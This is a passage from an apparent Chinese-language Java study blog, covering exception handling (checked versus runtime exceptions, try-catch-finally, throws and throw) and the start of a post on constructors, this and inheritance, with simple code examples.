class="line">javac NonRuntimeExceptionDemo1.java</span><br><span class="line">NonRuntimeExceptionDemo1.java:<span class="number">5</span>: unreported exception java.io.FileNotFoundException; must</span><br><span class="line"> be caught or declared to be thrown</span><br><span class="line">FileInputStream in=<span class="keyword">new</span> FileInputStream(<span class="string">&quot;text.txt&quot;</span>);</span><br><span class="line">                   ^</span><br><span class="line">NonRuntimeExceptionDemo1.java:<span class="number">7</span>: unreported exception java.io.IOException; mustbe</span><br><span class="line"> caught or declared to be thrown</span><br><span class="line"><span class="keyword">while</span>((s=in.read())!=-<span class="number">1</span>) System.out.print(s);</span><br><span class="line">                ^</span><br><span class="line">NonRuntimeExceptionDemo1.java:<span class="number">8</span>: unreported exception java.io.IOException; mustbe caught </span><br><span class="line">or declared to be thrown</span><br><span class="line">in.close();</span><br></pre></td></tr></table></figure>

<p>&amp;emsp;<br><font face="Comic sans MS"><font color="red"><strong>☕对运行时异常的说明：</strong></font>由于运行时异常可能会出现在程序的任何地方，而且出现的可能性非常大，因而由程序本身去检测运行异常出现与否，将会使程序的开销过大，所以<br>运行时异常是由Java运行时系统在程序的运行过程中检测到的,它可能在程序中任意部位发生,而且其数目可能很大,因此Java编译器允许程序不对它进行处理。这时，java运行时系统会把生成的运行时异常对象交给默认的异常处理，在标准输出设备上显示异常的内容以及发生异常的位置<br><font color="#00B2EE"><strong>建议对于运行时异常用户不要去捕获，捕获就是承认这个错误，但是一般我们编程的希望是发生错误能改正就尽量改正，除非不是由程序员自己意愿决定的错误。</strong></font><br>&amp;emsp;<br><font color="red"><br><strong>☕对运行时异常和非运行时异常的总结：</strong></font><br>(1) 当出现java.lang.ArithmeticException运行时异常时，不需要用户在程序中对其进行处理，而直接由Java运行时系统进行处理；<br>(2) 对于非运行时异常，Java编译器对程序进行编译的时候，便指出用户需要<font color="#00B2EE">①捕获该类异常</font>或者<font color="#00B2EE">②声明抛出</font>。即对于非运行时异常，用户需要在程序中进行处理，否则编译时无法通过。<br></font></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">① 捕获该类异常</span><br><span class="line">[例<span class="number">5</span>-<span class="number">2</span>] NonRuntimeExceptionDemo1.java</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">NonRuntimeExceptionDemo1</span></span></span><br><span class="line"><span class="class"></span>&#123; </span><br><span class="line">      <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span></span>&#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">             FileInputStream in=<span class="keyword">new</span> FileInputStream(<span class="string">&quot;text.txt&quot;</span>);</span><br><span class="line">            <span class="keyword">int</span> s;</span><br><span class="line">            <span class="keyword">while</span>((s=in.read())!=-<span class="number">1</span>) System.out.print(s);</span><br><span class="line">           in.close();</span><br><span class="line">              &#125;<span class="keyword">catch</span>(Exception e)&#123;…&#125;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">② 声明抛出</span><br><span class="line">[例<span class="number">5</span>-<span class="number">2</span>] NonRuntimeExceptionDemo1.java</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">NonRuntimeExceptionDemo1</span></span></span><br><span class="line"><span class="class"></span>&#123; </span><br><span class="line">      <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span><span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">      FileInputStream in=<span class="keyword">new</span> FileInputStream(<span class="string">&quot;text.txt&quot;</span>);</span><br><span class="line">      <span class="keyword">int</span> s;</span><br><span class="line">      <span class="keyword">while</span>((s=in.read())!=-<span class="number">1</span>) System.out.print(s);</span><br><span class="line">      in.close();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>&amp;emsp;<br>&amp;emsp;</p>
<h4 id="2-3-对于运行时异常和非运行时异常的一些说明"><a href="#2-3-对于运行时异常和非运行时异常的一些说明" class="headerlink" title="2.3  对于运行时异常和非运行时异常的一些说明"></a><font color="#20B2AA" face="Comic sans MS">2.3  对于运行时异常和非运行时异常的一些说明</font></h4><p><font face="Comic sans MS"><font color="red"><strong>1. ☕编译器和异常：</strong></font>编译器强制要求程序员捕获或声明抛出非运行时异常<br>   <em>到底为什么要这么做呢？？？</em><br>对于运行时异常，编译器不强制要求，但用户也可以自己去捕获<br>   <em>这个时候会出现什么效果呢？？？</em></p>
<p><font color="red"><strong>2. ☕运行时系统和异常：</strong></font><br>(1) 异常都有抛出的轨迹；<br>(2) 对于所有异常，某个方法产生的异常 ，如果没有被捕获，就会自动抛给方法的调用者（但是对非运行时异常一定要声明抛出），如果调用者还没有捕获，再抛给调用者的调用者，以此类推，直到main方法里发现还没有捕获，那么运行时系统就会来处理这个异常，把异常信息和异常的轨迹信息打印给用户。</p>
<p><font color="red"><strong>3. ☕两点建议：</strong></font><br>(1) 建议对于运行时异常用户不要去捕获，捕获就是承认这个错误，但是一般我们编程者希望是发生错误能改正就尽量改正，除非不是由程序员自己意愿决定的错误；<br>(2) 建议对于非运行时异常，用户应该去捕获，以交代程序员的处理该错误的代码，实在不行，就声明抛出给方法的调用者。</p>
<p><font color="red"><strong>3. ☕异常类常用的方法：</strong></font><br><font color="#00B2EE"><strong>public Exception()</strong></font><br><font color="#00B2EE"><strong>public Exception(String s)</strong></font>&amp;emsp; :该参数一般表示该异常对应的错误的描述<br><font color="#00B2EE"><strong>public String toString()</strong></font>&amp;emsp;:返回描述当前异常对象信息的字符串<br><font color="#00B2EE"><strong>public String getMessage()</strong></font>&amp;emsp;:返回描述当前异常对象信息的详细信息。<br><font color="#00B2EE"><strong>public void printStackTrace()</strong></font>&amp;emsp;:打印当前异常对象使用堆栈的轨迹。<br></font></p>
<p><img data-src="https://i.loli.net/2018/12/29/5c2656f46e0d4.png" alt="5S.png"></p>
<p><img data-src="https://i.loli.net/2018/12/29/5c2656f96a129.png" alt="4DI6.png"></p>
<p>&amp;emsp;<br>&amp;emsp;</p>
<h3 id="三、-try-catch-finally异常处理"><a href="#三、-try-catch-finally异常处理" class="headerlink" title="三、 try-catch-finally异常处理"></a><font color="#FF6347" face="Comic sans MS">三、 try-catch-finally异常处理</font></h3><h4 id="3-1-概括try-catch-finally语句"><a href="#3-1-概括try-catch-finally语句" class="headerlink" title="3.1  概括try-catch-finally语句"></a><font color="#20B2AA" face="Comic sans MS">3.1  概括try-catch-finally语句</font></h4><p><font face="Comic sans MS"><font color="red"><strong>用户处理异常的三种方法:</strong></font><br>       (1)用户可以用try-catch-finally语句进行<font color="#00B2EE"><strong>抛出</strong></font>和<font color="#00B2EE"><strong>捕获处理</strong></font>；<br>       (2)如果不想捕获和处理异常，可以通过throws语句<font color="#00B2EE"><strong>声明要抛出的异常</strong></font>；<br>       (3) 用户可以定义自己的异常类,并用throw语句来抛出。</p>
<p>运行时异常是由Java运行时系统在程序的运行过程中检测到的,它可能在程序中任意部位发生,而且其数目可能很大,因此Java编译器允许程序不对它进行处理。这时，java运行时系统会把生成的运行时异常对象交给默认的异常处理，在标准输出设备上显示异常的内容以及发生异常的位置。即：<font color="red"><strong>运行时异常：会输出到设备显示哪里存在错误，请更正；非运行时异常：编译报错时提示必须添加非运行时异常处理，比如加try{}…catch(类名 对象){}或者使用throws来抛出异常</strong></font>。<br></font></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span>-<span class="keyword">catch</span>-<span class="keyword">finally</span>语句对程序运行进行监控，捕获和处理异常通常形式： </span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">调用可能产生异常的方法及其它java语句；</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">catch</span>(异常类名<span class="number">1</span> 异常对象名e)&#123;</span><br><span class="line">异常处理语句块；</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">catch</span>(异常类名<span class="number">2</span> 异常对象名e)&#123;</span><br><span class="line">异常处理语句块；</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">finally</span>&#123;</span><br><span class="line">最终处理；</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">[例<span class="number">5</span>-<span class="number">3</span>]访问文本文件text.txt，并将其在屏幕上打印出来。</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TryCatchFinally</span></span></span><br><span class="line"><span class="class"></span>&#123; </span><br><span class="line">      <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span></span>&#123;</span><br><span class="line">       <span class="keyword">try</span>&#123;</span><br><span class="line">        FileInputStream in=<span class="keyword">new</span> FileInputStream(<span class="string">&quot;text.txt&quot;</span>);</span><br><span class="line">        <span class="keyword">int</span> s;</span><br><span class="line">        <span class="keyword">while</span>((s=in.read())!=-<span class="number">1</span>) System.out.print(s);</span><br><span class="line">        in.close();</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">catch</span>(FileNotFoundException e)&#123;</span><br><span class="line">          System.out.println(“捕获异常：”+e);   <span class="comment">//e会调用toString()方法回显异常信息给程序员</span></span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">catch</span>(IOException e)&#123;</span><br><span class="line">          System.out.println(<span class="string">&quot;捕获异常：&quot;</span>+e);</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">finally</span>&#123;</span><br><span class="line">       System.out.println(<span class="string">&quot;finally块总是执行！&quot;</span>);</span><br><span class="line">       &#125; &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line">捕获异常：java.io.FileNotFoundException: text.txt (系统找不到指定的文件。)</span><br><span class="line"><span class="keyword">finally</span>块总是执行！</span><br></pre></td></tr></table></figure>

<p>&amp;emsp;<br>&amp;emsp;</p>
<h4 id="3-2-try语句"><a href="#3-2-try语句" class="headerlink" title="3.2  try语句"></a><font color="#20B2AA" face="Comic sans MS">3.2  try语句</font></h4><p><font face="Comic sans MS">☕<font color="red"><strong>try{}</strong></font>：将可能抛出一个或者若干个异常的代码放入try语句块中。<br><font color="red"><strong>注意：</strong></font>应当尽量<strong>减小</strong>try代码块的大小，不要将整个程序代码全部放入try语句块中，而是应当仔细分析代码，在可能出现异常情况的地方用try进行监控。</p>
<p>因为当发生异常时，程序控制由try块转到catch块，Java将跳过try中后面的语句，且永远不会从catch块返回到try块。因此若将整个程序代码都放在try中，若一开始发生异常，则后面的语句将永远不会被执行，从而影响了程序的实现。<br></font></p>
<p>&amp;emsp;</p>
<h4 id="3-3-catch语句"><a href="#3-3-catch语句" class="headerlink" title="3.3  catch语句"></a><font color="#20B2AA" face="Comic sans MS">3.3  catch语句</font></h4><table><tr><td bgcolor=#ADD8E6><font face="Comic sans MS">**📒(1)** <font color="red">**try语句后面必须跟有一个或多个catch语句来处理try中产生的异常事件**</font>。如果try语句中未产生异常，
  那么catch语句将不执行。 
**📒(2)catch语句需要一个参数：**<font color="red">**一个异常类名和该异常类的对象。注意该异常类必须是Throwable类的子类**</font>.
**📒(3)** try块中发生了一个异常，try-catch语句就会自动在try块后面的各个catch块中，找出与该异常类相
        匹配的参数。当参数符合以下3个条件之一时，就认为这个参数与产生的异常相匹配：
        （1）参数与产生的异常属于一个类；
        （2）参数是产生的异常的父类；
        （3）参数是一个接口时，产生的异常实现了这一接口。 
<font color="red">**📒(4) 注意：**</font>
(1) 当产生的异常找到了第一个与之相匹配的参数时，就执行包含这一参数的catch语句中的Java代码，执
行完catch语句后，程序恢复执行，但不会回到异常发生处继续执行，而是执行try-catch结构后面的代码。
(2) 可以用一个catch块来处理多个异常类型，此时catch的参数应该是这多个异常的父类。
(3) 有多个catch块时，要细心安排catch块的顺序。<font color="red">  **将子类的catch块放在前面，父类的catch块放在后面。**</font>
</font></td></tr></table>

<p>&amp;emsp;</p>
<h4 id="3-4-finally子句"><a href="#3-4-finally子句" class="headerlink" title="3.4  finally子句"></a><font color="#20B2AA" face="Comic sans MS">3.4  finally子句</font></h4><table><tr><td bgcolor=#ADD8E6><font face="Comic sans MS"><font color="red">**1.finally语句：**</font> 无论在try块中是否产生异常，也不管产生的异常是否会被捕获，finally中的语句最终都会
                           被执行。
<font color="red">**2.作用：**</font> 为异常处理事件提供一个清理机制,例如清理打开文件、Socket、JDBC连接之类的资源。

<p>  如果程序用到了文件、Socket、JDBC连接之类的资源，即使遇到了异常，也要正确释放占用的资源。<br>&amp;ensp;<strong>finally语句可以说是为异常处理事件提供的一个清理机制. 一般是用来关闭文件或释放其他的系统资源，作<br>  为try-catch-finally结构的一部分，可以没有finally语句，如果存在finally语句，不论try块中是否发生<br>  了异常，是否执行过catch语句，都要执行finally语句。</strong></p>
<p><font color="red"><strong>3. 带有finally子句的try-catch-finally语句的形式如下：</strong></font></font></td></tr></table>  </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123; … &#125;           <span class="comment">//…是正常执行的代码, 可能产生异常</span></span><br><span class="line">       <span class="keyword">catch</span> (异常类<span class="number">1</span> e) &#123; … &#125;    <span class="comment">//…是异常类1的处理代码</span></span><br><span class="line">       <span class="keyword">catch</span> (异常类<span class="number">2</span> e) &#123; … &#125;    <span class="comment">//…是异常类1的处理代码</span></span><br><span class="line">        ……</span><br><span class="line">      <span class="keyword">catch</span> (异常类n e) &#123; … &#125;   <span class="comment">//…是异常类2的处理代码</span></span><br><span class="line">      <span class="keyword">finally</span> &#123; … &#125;                   <span class="comment">//…是执行清除工作的语句</span></span><br></pre></td></tr></table></figure>

<table><tr><td bgcolor=#ADD8E6><font face="Comic sans MS"><font color="red">**4.执行过程：**</font> 
**(1) try块中的语句没有产生异常。**在这种情况下，Java首先执行try块中的所有的语句，然后执行finally子句
    中的代码，最后执行try…catch..finally块后面的语句；
**(2) try块中的语句产生了异常，而且此异常在方法内被捕获(有catch匹配)。** 在这种情况下，Java首先执行try
    块中的语句，直到产生异常处，然后跳过此try块中剩下的语句，执行捕获此异常的catch子句的处理代码；
    然后执行finally子句中的代码；
**(3) 如果在catch子句又重新抛出了异常。**也会执行finally，然后将这个异常抛出给方法的调用者；
**(4) try块中产生了异常，而此异常在方法内没有被捕获(没有catch匹配) 。**在这种情况下，Java将执行try块
    中的代码直到产生异常，然后跳过try块中的代码而转去执行finally子句中的代码，最后将异常抛出给方法
    的调用者。
</font></font></td></tr></table>  

<p>&amp;emsp;<br>&amp;emsp;</p>
<h3 id="四、-throws-throw抛出异常"><a href="#四、-throws-throw抛出异常" class="headerlink" title="四、 throws-throw抛出异常"></a><font color="#FF6347" face="Comic sans MS">四、 throws-throw抛出异常</font></h3><h4 id="4-1-throws抛出异常"><a href="#4-1-throws抛出异常" class="headerlink" title="4.1  throws抛出异常"></a><font color="#20B2AA" face="Comic sans MS">4.1  throws抛出异常</font></h4><p><font face="Comic sans MS"><font color="red"><strong>📒throws说明：</strong></font><br><strong>在设计可能会抛出异常的方法时，可以有两个选择：</strong><br><font color="#00B2EE"><strong>(1) 使用try-catch-finally处理方法中的异常</strong></font>；<br><font color="#00B2EE"><strong>(2) 声明抛出异常：</strong></font>不捕获异常(<font color="red">没有throws方法的创建异常类的实例和抛出异常。是个空语句。</font>)，而是将异常交由上一层处理，在其他地方捕获异常。如果使用后者，那么应该（在某些情况下）向编译器表明：此方法可能会抛出异常，但方法本身不会捕获它。可以在方法头中用throws子句来实现此功能。</p>
<p>(2.1)带throws异常说明的方法说明形式如下：<br>       <font color="#00B2EE"> …  方法名(…) [throws 异常类列表]<br>        { 方法体  }<br></font><br>&amp;emsp;<br><font color="red"><strong>📒注意：</strong></font><br> （１）方法抛出的异常类是throws子句中指定的异常类或其子类。<br> （２）并不是所有可能发生的异常都要在方法的说明中指定，从Error类中派生出的异常和从RuntimeException类中派生的异常就不用在方法声明中指定。</p>
<p><font color="red"><strong>📒在下列情况下Java方法可以声明抛出异常：</strong></font><br> （１）调用的方法抛出了异常；<br> （２）检测到了错误并使用throw语句抛出异常；<br></font> </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">例<span class="number">1</span>：调用的方法抛出了异常 </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;……</span><br><span class="line"> <span class="function"><span class="keyword">public</span> String <span class="title">getInput</span><span class="params">()</span> <span class="keyword">throws</span> IOException</span></span><br><span class="line"><span class="function"> </span>&#123;……</span><br><span class="line">    System.in.read();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">例<span class="number">2</span>：检测到了错误并使用<span class="keyword">throw</span>语句抛出异常</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;……</span><br><span class="line"> <span class="function"><span class="keyword">public</span> String <span class="title">getInput</span><span class="params">()</span> <span class="keyword">throws</span> IOException</span></span><br><span class="line"><span class="function"> </span>&#123;……</span><br><span class="line">     IOException ae =<span class="keyword">new</span> IOException(<span class="string">&quot;buffer is full&quot;</span>);</span><br><span class="line">    <span class="keyword">throw</span> ae; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">例<span class="number">3</span>： <span class="keyword">throws</span>多个异常</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Animation</span></span></span><br><span class="line"><span class="class"></span>&#123;                                                   </span><br><span class="line"> <span class="function"><span class="keyword">public</span> Image <span class="title">loadImage</span><span class="params">(String s)</span> <span class="keyword">throws</span>  </span></span><br><span class="line"><span class="function">                 EOFException, MalformURLException  </span></span><br><span class="line"><span class="function"> </span>&#123;</span><br><span class="line">  ……</span><br><span class="line"> &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<p>&amp;emsp;<br>&amp;emsp;</p>
<h4 id="4-2-throw抛出异常"><a href="#4-2-throw抛出异常" class="headerlink" title="4.2  throw抛出异常"></a><font color="#20B2AA" face="Comic sans MS">4.2  throw抛出异常</font></h4><p><font face="Comic sans MS"><font color="red"><strong>📒throw说明：</strong></font><br><strong>要使用throw，则必须在方法名后面指出throws；但是使用throws，抛出可以是空语句不用写，交给上一层处理！！</strong><br>在捕获一个异常前，必须有一段Java代码来生成和抛出一个异常对象。Java用throw语句抛出异常。throw语句的格式如下：<br>                <font color="red">throw ThrowableObject；<br></font><br>&amp;emsp;<br><font color="#00B2EE"><strong>异常对象的生成和抛出可以有以下三种情况：</strong></font><br>　　　（１）Java运行时系统<br>　　　（２）JDK中某个类<br>　　　（３）在程序中创建异常对象抛出</p>
<p><font color="#00B2EE"><strong>使用throw语句应注意：</strong></font><br>（１）一般这种抛出异常的语句应该在满足一定条件执行，例如把throw语句if分支中<br>（２）含有throw语句的方法，应该在方法头定义中用throws语句声明所有可能抛出的异常</p>
<p><font color="#00B2EE"><strong>抛出异常有这样三步：</strong></font><br>    （1）确定异常类；<br>    （2）创建异常类的实例；<br>    （3）抛出异常。<br></font></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">举例</span><br><span class="line"><span class="function"><span class="keyword">static</span> String <span class="title">getInput</span><span class="params">()</span> <span class="keyword">throws</span> IOException</span>&#123;</span><br><span class="line">  <span class="keyword">char</span>[] buffer =<span class="keyword">new</span> <span class="keyword">char</span>[<span class="number">20</span>];</span><br><span class="line">   <span class="keyword">int</span> counter = <span class="number">0</span>;</span><br><span class="line">   <span class="keyword">boolean</span> flag =<span class="keyword">true</span>;</span><br><span class="line">   <span class="keyword">while</span>(flag) &#123;</span><br><span class="line">       buffer[counter] =(<span class="keyword">char</span>)System.in.read(); </span><br><span class="line">         </span><br><span class="line">      <span class="keyword">if</span>(buffer[counter]==<span class="string">&#x27;\n&#x27;</span>) flag = <span class="keyword">false</span>;</span><br><span class="line">      counter++;</span><br><span class="line">      <span class="keyword">if</span>(counter&gt;=<span class="number">20</span>)&#123;</span><br><span class="line">&#125; IOException ae =<span class="keyword">new</span> IOException(<span class="string">&quot;buffer is full&quot;</span>); </span><br><span class="line">      <span class="keyword">throw</span> ae; &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> String(buffer);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"> <span class="string">&quot;//IOException ae =new IOException(&quot;</span><span class="string">&quot;buffer is full&quot;</span><span class="string">&quot;);  throw ae;&quot;</span>使用<span class="keyword">throw</span></span><br></pre></td></tr></table></figure>


<p>&amp;emsp;<br>&amp;emsp;</p>
<h3 id="五、-正确地使用异常"><a href="#五、-正确地使用异常" class="headerlink" title="五、 正确地使用异常"></a><font color="#FF6347" face="Comic sans MS">五、 正确地使用异常</font></h3><table><tr><td bgcolor=#ADD8E6><font face="Comic sans MS">由于异常使用起来非常方便，以至于在很多情况下可能会滥用异常。但是，使用异常处理会降低程序运行的
速度，几点建议：

<p><font color="red"><strong>（1） 在可以使用简单的测试就能完成的检查中，不要使用异常来代替它。</strong></font>例如：<br>      if (ins!&#x3D;null)       &#x2F;&#x2F;使用ins引用对象<br>       {  …   }</p>
<p><font color="red"><strong>（2） 不要过细地使用异常。</strong></font>最好不要到处使用异常，更不要在循环体内使用异常处理, 可以将它包裹在循环<br>体外面。<br><font color="red"><strong>（3）不要捕获了一个异常而又不对它做任何的处理。</strong></font><br>   try<br>   {<br>     …… &#x2F;&#x2F;正常执行的代码<br>   }<br>   catch(Exception e) {  }</p>
<p><font color="red"><strong>(4) 将异常保留给方法的调用者并非不好的做法。</strong></font><br>     对于有些异常，将其交给方法的调用者去处理是一种更好的处理办法。没有类似这样if(counter&gt;&#x3D;20){<br>      IOException ae &#x3D;new IOException(“buffer is full”);<br>      throw ae; }的语句，是个空语句。<br></font></font></td></tr></table>  </p>
<hr>
<hr>
<p>&amp;emsp;<br>&amp;emsp;<br>&amp;emsp;<br>&amp;emsp;</p>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Java学习</tag>
      </tags>
  </entry>
  <entry>
    <title>Java构造方法、对象创建、继承(4.5-4.6)</title>
    <url>/post/Java-Inherit-4/</url>
    <content><![CDATA[<p>&amp;ensp;<br>&amp;ensp;</p>
<center><font color="#3CB371" face="Comic sans MS" size=5>继承</font></center>

<p>&amp;ensp;<br>&amp;ensp;</p>
<h3 id="一、-构造方法"><a href="#一、-构造方法" class="headerlink" title="一、 构造方法"></a><font color="#FF6347" face="Comic sans MS">一、 构造方法</font></h3><p><font color="red"><strong>📒定义：</strong></font> 构造方法是一种特殊的、与类同名的方法，专门用于<font color="red">创建对象，完成初始化工作。</font> </p>
<p>&amp;emsp;</p>
<table><tr><td bgcolor=#ADD8E6><font face="Comic sans MS"><font color="red">**📒构造方法的特殊性：**</font> 
**(1)构造方法的方法名与类名相同。**
**(2)构造方法没有返回类型，也不能写void。**
**(3)构造方法的主要作用是完成对类对象的初始化工作。**
**(4)构造方法一般不能由编程人员显式地直接调用，而是用new来调用。**
**(5)在创建一个类的新对象的同时，系统会自动调用该类的构造方法为新对象初始化。**
**(6)在Java中，每个类都至少有一个构造方法，如果没有显示地定义构造方法，Java
   会自动提供一个缺省的构造方法。**
</font></td></tr></table>

<p>&amp;emsp;<br>&amp;emsp;</p>
<h4 id="1-1-构造方法说明"><a href="#1-1-构造方法说明" class="headerlink" title="1.1  构造方法说明"></a><font color="#3CB371" face="Comic sans MS">1.1  构造方法说明</font></h4><p><font color="red"><strong>📒构造方法说明形式如下：</strong></font><br><font color="red">[构造方法修饰符] 方法名（[形式参数列表]）[throws异常列表] {方法体}</font> </p>
<table><tr><td bgcolor=#ADD8E6><font face="Comic sans MS">**📒当构造一个类的实例时，编译器主要完成以下3件事情：**
(1) 为对象分配内存空间(堆)；
(2) 按缺省值初始化对象中的实例变量的值；
(3) 调用对象的构造方法(可以在构造方法中初始化其他的值)；
(4) 对象变量都是引用型变量。
</font></td></tr></table>

<p>&amp;emsp;<br>&amp;emsp;</p>
<h4 id="1-2-构造方法的重载"><a href="#1-2-构造方法的重载" class="headerlink" title="1.2  构造方法的重载"></a><font color="#3CB371" face="Comic sans MS">1.2  构造方法的重载</font></h4><table><tr><td bgcolor=#ADD8E6><font face="Comic sans MS">(1)  缺省的构造方法：如果没有定义构造方法，则Java自动提供了一个缺省的构造方法，如下：
public Person(){}；//对象成员变量的初值按Java规定
(2)  带参数的构造方法：按需要将一些指定的参数传递给构造方法 
 例如：public Person(String n){Name=n;}
**📒定义构造方法注意：**
&emsp;只要类中显式定义了一个或多个构造方法，而且所有显式定义的构造方法都带参数，那么将失去缺省
   构造方法。
</font></td></tr></table>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">PersonC(String n ,<span class="keyword">int</span> a)&#123;</span><br><span class="line">   name=n;</span><br><span class="line">   age=a;</span><br><span class="line">   System.out.println(<span class="string">&quot;The Person&#x27;s name is &quot;</span>+name+<span class="string">&quot;,age is &quot;</span>+age);&#125; </span><br><span class="line"> <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span></span>&#123;</span><br><span class="line">      PersonC per1=<span class="keyword">new</span> PersonC();</span><br><span class="line">      PersonC per2=<span class="keyword">new</span> PersonC(<span class="string">&quot;wang li&quot;</span>);</span><br><span class="line">      PersonC per3=<span class="keyword">new</span> PersonC(<span class="string">&quot;li ming&quot;</span>,<span class="number">24</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>&amp;emsp;<br>&amp;emsp;</p>
<h4 id="1-3-对象的创建"><a href="#1-3-对象的创建" class="headerlink" title="1.3  对象的创建"></a><font color="#3CB371" face="Comic sans MS">1.3  对象的创建</font></h4><table><tr><td bgcolor=#ADD8E6><font face="Comic sans MS">**1.3.1 📒对象说明：**
对象说明的语法形式为：
&emsp;&emsp;&emsp;<font color="red">类名&emsp;对象名；</font>
**1.3.2. 📒对象的实例化和初始化:**
**对象构造的语法形式为：**
&emsp;&emsp;&emsp;<font color="red">对象名=new 类构造方法名([实参表]);</font> 
**由new操作符和相应的构造方法完成：**
new以类为模板，开辟空间并执行相应的构造方法，完成对象的实例化和初始化，并返回该对象的一个引
用（即该对象所在的内存首地址)
</font></td></tr></table>

<p>&amp;emsp;<br>&amp;emsp;</p>
<h4 id="1-4-this的使用"><a href="#1-4-this的使用" class="headerlink" title="1.4  this的使用"></a><font color="#3CB371" face="Comic sans MS">1.4  this的使用</font></h4><table><tr><td bgcolor=#ADD8E6><font face="Comic sans MS">**1.4.1 📒使用this来访问成员变量及方法**
在方法及构造方法中，可以使用this来访问对象的属性和方法 .
**1.4.2. 📒构造方法中，用this调用另一构造方法：**
**1.4.3. 📒使用this的注意事项：**
(1)通过this不仅可以引用该类中定义的变量和方法，还可以引用该类的父类中定义的成员变量和方法。
(2)在所有的非static方法中，都隐含了一个参数this。而static方法中，不能使用this。
</font></td></tr></table>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.4</span><span class="number">.1</span></span><br><span class="line"> Person(String n,<span class="keyword">int</span> a)&#123;</span><br><span class="line">        name=n;</span><br><span class="line">        age=a;</span><br><span class="line">    &#125; </span><br><span class="line">等价于如下：</span><br><span class="line"> Person(String name,<span class="keyword">int</span> age)</span><br><span class="line">           &#123;<span class="keyword">this</span>.name=name;</span><br><span class="line">             <span class="keyword">this</span>.age=age;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.4</span><span class="number">.2</span> </span><br><span class="line"> Desk()&#123;   Color=<span class="string">&quot;&quot;</span>;</span><br><span class="line">           Length=<span class="number">0</span>;</span><br><span class="line">         Width=<span class="number">0</span>;</span><br><span class="line">         Height=<span class="number">0</span>;&#125; </span><br><span class="line"> Desk(String C,<span class="keyword">int</span> L,<span class="keyword">int</span> W,<span class="keyword">int</span> H)</span><br><span class="line">  &#123;Color=C;</span><br><span class="line">     Length=L;</span><br><span class="line">   Width=W;</span><br><span class="line">   Height=H;&#125; </span><br><span class="line"> Desk()&#123;</span><br><span class="line">    <span class="keyword">this</span>(<span class="string">&quot;&quot;</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>);&#125;</span><br></pre></td></tr></table></figure>

<p>&amp;emsp;<br>&amp;emsp;</p>
<h3 id="二、-继承"><a href="#二、-继承" class="headerlink" title="二、 继承"></a><font color="#FF6347" face="Comic sans MS">二、 继承</font></h3><h4 id="2-1-类继承语法形式"><a href="#2-1-类继承语法形式" class="headerlink" title="2.1  类继承语法形式"></a><font color="#3CB371" face="Comic sans MS">2.1  类继承语法形式</font></h4><table><tr><td bgcolor=#ADD8E6><font face="Comic sans MS">**2.1.1 📒类继承语法形式如下：**
&emsp;&emsp;<font color="red">class&emsp;SubClassName&emsp;extends&emsp;SupperClassName</font>
extends：继承关键词
SubClassName：新的子类名
SupperClassName：继承的父类名，必须有且只能一个（即每个子类有且只能有一个父类）
**2.1.2 📒子类的特性:**
(1) 子类拥有其父类的所有属性和方法。但父类中说明为private的属性和方法，子类不可直接访问。
(2) 子类可以对父类的方法覆盖或重载。
</font></td></tr></table>

<p>&amp;emsp;<br>&amp;emsp;</p>
